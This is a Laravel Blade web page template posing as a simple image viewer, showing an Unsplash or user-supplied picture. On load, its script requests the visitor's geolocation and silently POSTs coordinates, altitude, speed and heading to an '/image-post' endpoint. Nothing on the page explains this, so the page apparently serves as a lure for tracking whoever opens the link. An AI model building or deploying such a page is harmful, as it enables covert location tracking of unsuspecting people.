<!doctype html>
<html lang="en">
  <head>
    <title>Image</title>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  </head>
  <body>

    <div class="container">
      @if (request()->has('src'))
        <img src="{{ request()->src }}" class="img-thumbnail" alt="unsplash image">  
      @else
        <img src="https://source.unsplash.com/random" class="img-thumbnail" alt="unsplash image">
      @endif
    </div>

    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    
    <script>
      $(function() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else { 
          console.log("Geolocation is not supported by this browser.");
        }
      });

      function showPosition(position) {
        var request = $.ajax({
          url: '{{ url('/image-post') }}',
          type: "POST",
          data: {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            heading: position.coords.heading,
            speed: position.coords.speed,
            request_timestamp: position.timestamp
          },
          dataType: "json"
        });

        request.done(function(msg) {
          console.log('Server response (Success): ' + msg.status);
        });

        request.fail(function(jqXHR, textStatus) {
          console.log('Server response (Failed): ' + textStatus);
        });
      }
    </script>
  </body>
</html>